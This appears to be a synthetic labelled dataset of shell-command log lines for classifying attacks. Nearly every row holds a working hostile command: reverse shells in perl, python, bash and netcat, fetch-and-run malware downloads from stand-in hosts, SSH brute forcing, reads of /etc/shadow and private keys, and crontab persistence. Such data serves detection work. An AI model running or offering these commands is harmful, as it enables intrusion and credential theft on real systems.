id,timestamp,log,label
log-209,2025-01-24T17:09:10.540584Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-210,2025-05-21T16:22:38.540593Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-211,2025-04-30T11:33:55.540602Z,nc -e /bin/sh 10.0.0.5 2222,reverse_shell
log-212,2025-11-30T17:16:52.540610Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-213,2025-07-22T09:57:11.540620Z,sshpass -p '123456' ssh admin@45.23.11.9,brute_force
log-214,2025-01-20T09:51:20.540629Z,curl -fsSL http://payloads.net/p47.php -o /tmp/p47.php; php /tmp/p47.php,malware_download
log-215,2025-04-25T15:43:11.540638Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-216,2025-06-26T17:17:45.540647Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
log-217,2025-10-09T07:22:40.540655Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-218,2024-12-27T09:43:41.540665Z,curl -fsSL http://malware.srv/install38.php -o /tmp/install38.php; php /tmp/install38.php,malware_download
log-219,2025-05-15T08:27:05.540675Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
log-220,2024-12-31T14:58:54.540684Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
log-221,2025-03-20T09:01:06.540693Z,wget http://malware.srv/install14.sh && chmod +x install14.sh && ./ install14.sh,malware_download
log-222,2025-11-24T10:19:48.540702Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-223,2025-03-15T10:19:27.540712Z,"python3 -c 'import urllib.request as u;open(""/tmp/update44.py"",""wb"").write(u.urlopen(""http://evil.example/update44.py"").read())'; python3 /tmp/update44.py",malware_download
log-224,2025-10-10T03:05:05.540721Z,nc -e /bin/sh 172.16.0.9 80,reverse_shell
log-225,2025-02-23T12:23:00.540729Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-226,2025-02-06T12:16:03.540738Z,mkdir /tmp/persist58; chmod 777 /tmp/persist58,persistence_or_filesystem
log-227,2025-08-28T11:14:53.540748Z,bash -i >& /dev/tcp/10.0.0.5/443 0>&1,reverse_shell
log-228,2025-04-16T05:25:47.540757Z,"python3 -c 'import urllib.request as u;open(""/tmp/payload15.py"",""wb"").write(u.urlopen(""http://malware.srv/payload15.py"").read())'; python3 /tmp/payload15.py",malware_download
log-229,2024-12-16T22:45:37.540767Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
log-230,2025-09-12T10:04:47.540776Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-231,2025-05-24T07:27:38.540785Z,bash -i >& /dev/tcp/192.0.2.12/6666 0>&1,reverse_shell
log-232,2025-11-21T19:52:40.540795Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 2222 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-233,2025-03-20T23:47:07.540805Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""203.0.113.7"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-234,2025-01-06T18:53:41.540814Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-235,2025-02-08T15:08:28.540823Z,nc -e /bin/sh 10.0.0.5 9001,reverse_shell
log-236,2025-07-16T06:10:34.540832Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-237,2025-07-18T04:01:36.540841Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-238,2025-02-14T04:52:55.540869Z,curl -fsSL http://malicious.test/runme51.php -o /tmp/runme51.php; php /tmp/runme51.php,malware_download
log-239,2025-06-01T11:21:08.540885Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-240,2025-03-08T13:25:36.540895Z,echo '@reboot root /tmp/runme86.sh' >> /etc/crontab,persistence_or_filesystem
log-241,2025-04-02T15:23:31.540905Z,"python3 -c 'import urllib.request as u;open(""/tmp/update71.py"",""wb"").write(u.urlopen(""http://malicious.test/update71.py"").read())'; python3 /tmp/update71.py",malware_download
log-242,2025-12-06T12:19:53.540914Z,mkdir /tmp/backdoor59; chmod 777 /tmp/backdoor59,persistence_or_filesystem
log-243,2025-05-30T04:16:51.540923Z,curl -fsSL http://badhost.local/runme47.php -o /tmp/runme47.php; php /tmp/runme47.php,malware_download
log-244,2025-08-19T10:32:49.540933Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme12.py"",""wb"").write(u.urlopen(""http://badhost.local/runme12.py"").read())'; python3 /tmp/runme12.py",malware_download
log-245,2024-12-16T23:05:41.540942Z,curl -fsSL http://malware.srv/runme44.php -o /tmp/runme44.php; php /tmp/runme44.php,malware_download
log-246,2025-05-25T23:03:34.540952Z,sshpass -p 'toor' ssh root@1.2.3.4,brute_force
log-247,2025-09-20T12:55:02.540960Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-248,2025-05-01T16:27:23.540969Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-249,2025-03-16T05:48:34.540978Z,find / -name '*.conf' -type f,enumeration
log-250,2025-03-26T04:40:31.540987Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-251,2024-12-22T21:37:00.540996Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-252,2025-03-22T17:28:35.541004Z,cat /etc/passwd,credential_harvest
log-253,2025-10-25T16:37:25.541013Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-254,2025-08-07T01:47:56.541023Z,curl -fsSL http://malicious.test/update90.php -o /tmp/update90.php; php /tmp/update90.php,malware_download
log-255,2025-11-30T22:54:41.541032Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-256,2025-10-08T02:50:18.541041Z,cat /etc/passwd,credential_harvest
log-257,2025-03-26T07:16:03.541050Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-258,2025-11-30T19:00:12.541060Z,curl -fsSL http://badhost.local/runme66.php -o /tmp/runme66.php; php /tmp/runme66.php,malware_download
log-259,2025-06-26T18:01:51.541069Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
log-260,2025-11-01T10:58:25.541078Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-261,2025-07-04T05:14:05.541088Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-262,2025-08-09T08:11:24.541099Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.0.2.12"",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-263,2025-03-31T01:43:35.541108Z,nc -e /bin/sh 1.2.3.4 443,reverse_shell
log-264,2025-10-24T06:45:43.541117Z,echo 'hello world',unknown
log-265,2025-07-26T16:26:17.541127Z,curl -fsSL http://payloads.net/runme17.php -o /tmp/runme17.php; php /tmp/runme17.php,malware_download
log-266,2025-02-10T23:56:22.541136Z,echo '@reboot root /tmp/p26.sh' >> /etc/crontab,persistence_or_filesystem
log-267,2025-07-02T11:02:14.541145Z,curl -fsSL http://payloads.net/payload46.php -o /tmp/payload46.php; php /tmp/payload46.php,malware_download
log-268,2024-12-07T18:52:11.541155Z,nc -e /bin/sh 45.23.11.9 443,reverse_shell
log-269,2025-02-25T07:52:40.541164Z,echo '@reboot root /tmp/x4.sh' >> /etc/crontab,persistence_or_filesystem
log-270,2025-05-30T04:57:31.541174Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-271,2025-10-20T15:50:09.541184Z,mkdir /tmp/backdoor17; chmod 777 /tmp/backdoor17,persistence_or_filesystem
log-272,2025-05-02T21:36:55.541198Z,"python3 -c 'import urllib.request as u;open(""/tmp/install4.py"",""wb"").write(u.urlopen(""http://evil.example/install4.py"").read())'; python3 /tmp/install4.py",malware_download
log-273,2025-07-08T09:44:35.541207Z,bash -i >& /dev/tcp/10.0.0.5/2222 0>&1,reverse_shell
log-274,2025-03-12T18:50:09.541216Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
log-275,2025-03-24T16:11:52.541225Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-276,2025-06-06T06:38:41.541234Z,bash -i >& /dev/tcp/10.0.0.5/6666 0>&1,reverse_shell
log-277,2025-08-16T06:56:48.541243Z,echo 'hello world',unknown
log-278,2025-11-22T15:06:10.541252Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-279,2025-11-08T19:26:15.541261Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-280,2025-11-07T03:06:33.541270Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-281,2025-10-16T15:39:12.541279Z,curl -fsSL http://evil.example/update91.php -o /tmp/update91.php; php /tmp/update91.php,malware_download
log-282,2024-12-31T06:27:51.541288Z,bash -i >& /dev/tcp/172.16.0.9/2222 0>&1,reverse_shell
log-283,2025-02-16T13:38:58.541297Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-284,2025-09-25T15:50:59.541306Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-285,2025-08-02T01:26:20.541315Z,cat /etc/passwd,credential_harvest
log-286,2025-06-10T08:01:37.541410Z,nc -e /bin/sh 1.2.3.4 2222,reverse_shell
log-287,2025-11-26T16:18:11.541422Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-288,2025-02-05T05:33:54.541431Z,nc -e /bin/sh 10.0.0.5 8080,reverse_shell
log-289,2025-08-23T20:59:24.541440Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-290,2025-02-17T07:53:40.541449Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-291,2025-10-19T02:58:12.541458Z,find / -name '*.conf' -type f,enumeration
log-292,2025-01-12T08:05:46.541468Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-293,2025-08-13T18:07:45.541477Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-294,2025-03-14T12:39:55.541486Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-295,2025-02-17T09:05:25.541495Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-296,2025-11-15T12:29:33.541504Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-297,2025-02-25T13:26:23.541513Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme9.py"",""wb"").write(u.urlopen(""http://malicious.test/runme9.py"").read())'; python3 /tmp/runme9.py",malware_download
log-298,2025-02-19T06:30:04.541522Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-299,2025-05-24T04:04:01.541531Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-300,2025-05-18T15:50:16.541541Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
log-301,2024-12-16T00:19:52.541550Z,cat /etc/passwd,credential_harvest
log-302,2025-01-11T00:39:22.541568Z,echo 'hello world',unknown
log-303,2024-12-08T09:27:19.541578Z,curl -fsSL http://payloads.net/payload21.php -o /tmp/payload21.php; php /tmp/payload21.php,malware_download
log-304,2025-11-11T14:47:10.541588Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
log-305,2025-03-31T06:16:43.541597Z,cat /etc/shadow,credential_harvest
log-306,2025-11-22T13:49:58.541606Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-307,2024-12-23T03:34:59.541616Z,curl -fsSL http://malicious.test/runme53.php -o /tmp/runme53.php; php /tmp/runme53.php,malware_download
log-308,2024-12-08T04:30:20.541625Z,sshpass -p 'password' ssh root@203.0.113.7,brute_force
log-309,2025-10-16T03:38:22.541635Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-310,2025-06-17T17:50:26.541645Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
log-311,2025-02-02T13:11:40.541653Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-312,2025-11-18T06:40:47.541662Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-313,2025-01-04T07:34:55.541671Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-314,2025-07-02T12:35:53.541681Z,wget http://payloads.net/runme43.sh && chmod +x runme43.sh && ./ runme43.sh,malware_download
log-315,2025-02-11T06:46:43.541690Z,cat /etc/shadow,credential_harvest
log-316,2025-09-20T22:54:21.541699Z,mkdir /tmp/backdoor7; chmod 777 /tmp/backdoor7,persistence_or_filesystem
log-317,2025-06-19T04:55:55.541708Z,date; whoami,unknown
log-318,2025-10-22T23:11:44.541717Z,date; whoami,unknown
log-319,2025-05-30T03:23:40.541726Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-320,2025-10-02T00:10:03.541735Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-321,2024-12-20T23:02:09.541744Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-322,2025-11-25T06:26:13.541754Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-323,2025-11-12T23:58:15.541763Z,sshpass -p '123456' ssh root@172.16.0.9,brute_force
log-324,2024-12-12T22:19:55.541772Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-325,2025-10-14T09:16:51.541781Z,wget http://badhost.local/payload78.sh && chmod +x payload78.sh && ./ payload78.sh,malware_download
log-326,2025-03-14T20:33:52.541789Z,cat /etc/passwd,credential_harvest
log-327,2025-12-06T03:26:34.541799Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-328,2025-01-11T19:29:27.541808Z,cat /etc/passwd,credential_harvest
log-329,2025-06-29T12:23:49.541817Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 4444 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-330,2025-07-23T00:31:22.541827Z,cat /etc/passwd,credential_harvest
log-331,2025-01-08T21:50:05.541837Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-332,2024-12-21T23:09:00.541847Z,wget http://malicious.test/x79.sh && chmod +x x79.sh && ./ x79.sh,malware_download
log-333,2024-12-11T08:47:57.541857Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 2222 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-334,2025-06-12T04:33:15.541866Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-335,2025-08-05T15:51:34.541876Z,nc -e /bin/sh 172.16.0.9 8080,reverse_shell
log-336,2025-02-16T11:35:32.541884Z,echo 'hello world',unknown
log-337,2025-02-24T07:54:54.541894Z,"python3 -c 'import urllib.request as u;open(""/tmp/p52.py"",""wb"").write(u.urlopen(""http://payloads.net/p52.py"").read())'; python3 /tmp/p52.py",malware_download
log-338,2025-11-09T19:47:27.541904Z,wget http://malware.srv/runme86.sh && chmod +x runme86.sh && ./ runme86.sh,malware_download
log-339,2025-01-03T19:50:01.541913Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-340,2025-05-12T00:00:46.541922Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
log-341,2025-05-09T02:12:51.541931Z,bash -i >& /dev/tcp/1.2.3.4/443 0>&1,reverse_shell
log-342,2025-12-04T08:35:50.541940Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-343,2025-01-04T06:02:31.541949Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-344,2025-09-29T22:52:34.541958Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-345,2025-06-13T23:04:36.541967Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-346,2025-02-17T12:42:26.541976Z,some-weird-tool --foo bar,unknown
log-347,2024-12-29T01:50:46.541985Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-348,2025-03-05T02:43:51.541995Z,curl -fsSL http://badhost.local/runme38.php -o /tmp/runme38.php; php /tmp/runme38.php,malware_download
log-349,2025-01-01T02:11:48.542005Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-350,2025-04-24T19:41:42.542014Z,echo '@reboot root /tmp/runme33.sh' >> /etc/crontab,persistence_or_filesystem
log-351,2025-10-29T21:05:58.542023Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-352,2025-09-15T06:38:41.542032Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-353,2025-01-25T16:56:33.542040Z,find / -name '*.conf' -type f,enumeration
log-354,2025-09-16T12:45:49.542050Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-355,2025-01-24T08:35:32.542059Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 8080 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-356,2024-12-22T16:13:20.542069Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
log-357,2025-03-21T11:41:05.542078Z,nc -e /bin/sh 10.0.0.5 6666,reverse_shell
log-358,2025-11-03T20:13:58.542087Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-359,2025-04-15T15:49:47.542097Z,cat /etc/passwd,credential_harvest
log-360,2025-01-18T13:10:54.542106Z,wget http://evil.example/payload30.sh && chmod +x payload30.sh && ./ payload30.sh,malware_download
log-361,2025-10-30T14:53:01.542115Z,sshpass -p 'toor' ssh root@172.16.0.9,brute_force
log-362,2025-11-21T10:38:59.542125Z,mkdir /tmp/backdoor85; chmod 777 /tmp/backdoor85,persistence_or_filesystem
log-363,2025-02-26T07:41:51.542135Z,curl -fsSL http://malicious.test/update87.php -o /tmp/update87.php; php /tmp/update87.php,malware_download
log-364,2025-01-10T09:14:44.542145Z,wget http://evil.example/update27.sh && chmod +x update27.sh && ./ update27.sh,malware_download
log-365,2025-02-28T11:06:47.542154Z,curl -fsSL http://malicious.test/p24.php -o /tmp/p24.php; php /tmp/p24.php,malware_download
log-366,2025-06-07T23:14:20.542164Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-367,2025-01-25T16:46:40.542173Z,cat /etc/passwd,credential_harvest
log-368,2025-08-15T04:34:30.542182Z,cat /etc/passwd,credential_harvest
log-369,2025-04-01T07:49:17.542191Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 80 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-370,2025-11-27T09:26:29.542201Z,wget http://badhost.local/runme81.sh ; chmod +x runme81.sh ; ./ runme81.sh,malware_download
log-371,2025-09-21T14:35:17.542210Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-372,2025-08-06T05:33:03.542220Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.0.2.12"",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-373,2025-11-16T19:56:24.542229Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-374,2025-04-10T11:21:14.542237Z,cat /etc/passwd,credential_harvest
log-375,2025-01-06T14:07:32.542246Z,find / -name '*.conf' -type f,enumeration
log-376,2025-02-01T03:40:01.542256Z,nc -e /bin/sh 10.0.0.5 2222,reverse_shell
log-377,2025-06-04T05:59:17.542265Z,sshpass -p 'admin123' ssh root@45.23.11.9,brute_force
log-378,2025-08-21T06:23:49.542274Z,cat /etc/passwd,credential_harvest
log-379,2025-09-23T01:52:17.542284Z,"python3 -c 'import urllib.request as u;open(""/tmp/x81.py"",""wb"").write(u.urlopen(""http://evil.example/x81.py"").read())'; python3 /tmp/x81.py",malware_download
log-380,2025-04-09T10:22:12.542294Z,curl -fsSL http://malware.srv/p28.php -o /tmp/p28.php; php /tmp/p28.php,malware_download
log-381,2025-02-04T06:24:15.542303Z,"python3 -c 'import urllib.request as u;open(""/tmp/x93.py"",""wb"").write(u.urlopen(""http://malware.srv/x93.py"").read())'; python3 /tmp/x93.py",malware_download
log-382,2025-01-31T00:24:03.542313Z,"python3 -c 'import urllib.request as u;open(""/tmp/payload65.py"",""wb"").write(u.urlopen(""http://payloads.net/payload65.py"").read())'; python3 /tmp/payload65.py",malware_download
log-383,2025-12-06T04:16:09.542323Z,wget http://malware.srv/install85.sh && chmod +x install85.sh && ./ install85.sh,malware_download
log-384,2025-02-08T06:55:52.542332Z,for i in {1..1000}; do ssh root@1.2.3.4 -p 80 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-385,2025-09-02T03:42:29.542342Z,curl -fsSL http://badhost.local/update77.php -o /tmp/update77.php; php /tmp/update77.php,malware_download
log-386,2025-06-05T00:01:35.542350Z,cat /etc/passwd,credential_harvest
log-387,2025-02-24T10:20:27.542359Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
log-388,2025-08-11T11:38:49.542370Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme18.py"",""wb"").write(u.urlopen(""http://badhost.local/runme18.py"").read())'; python3 /tmp/runme18.py",malware_download
log-389,2025-05-21T04:45:20.542378Z,cat /etc/passwd,credential_harvest
log-390,2025-11-17T13:54:51.542388Z,wget http://malicious.test/p34.sh ; chmod +x p34.sh ; ./ p34.sh,malware_download
log-391,2025-12-01T20:33:47.542397Z,echo '@reboot root /tmp/x82.sh' >> /etc/crontab,persistence_or_filesystem
log-392,2025-01-06T03:53:48.542406Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-393,2024-12-12T01:24:32.542415Z,echo 'hello world',unknown
log-394,2025-05-14T06:58:31.542424Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-395,2025-02-15T18:47:59.542433Z,curl -fsSL http://payloads.net/update15.php -o /tmp/update15.php; php /tmp/update15.php,malware_download
log-396,2025-11-22T10:21:33.542442Z,cat /etc/shadow,credential_harvest
log-397,2024-12-13T18:19:08.542452Z,wget http://payloads.net/update53.sh && chmod +x update53.sh && ./ update53.sh,malware_download
log-398,2025-06-08T19:56:58.542462Z,nc -e /bin/sh 172.16.0.9 80,reverse_shell
log-399,2025-08-05T18:14:38.542471Z,echo '@reboot root /tmp/runme26.sh' >> /etc/crontab,persistence_or_filesystem
log-400,2025-12-03T08:11:33.542480Z,curl -fsSL http://malicious.test/p11.php -o /tmp/p11.php; php /tmp/p11.php,malware_download
log-401,2025-08-15T06:54:41.542489Z,echo '@reboot root /tmp/install24.sh' >> /etc/crontab,persistence_or_filesystem
log-402,2024-12-14T09:02:23.542500Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme23.py"",""wb"").write(u.urlopen(""http://payloads.net/runme23.py"").read())'; python3 /tmp/runme23.py",malware_download
log-403,2025-01-27T18:27:06.542509Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
log-404,2025-05-30T14:36:54.542518Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
log-405,2025-02-25T12:10:14.542527Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-406,2025-01-18T09:05:00.542536Z,find / -name '*.conf' -type f,enumeration
log-407,2025-08-18T18:38:55.542545Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-408,2025-11-26T12:54:55.542554Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
log-409,2025-04-23T01:03:08.542564Z,curl -fsSL http://malware.srv/update42.php -o /tmp/update42.php; php /tmp/update42.php,malware_download
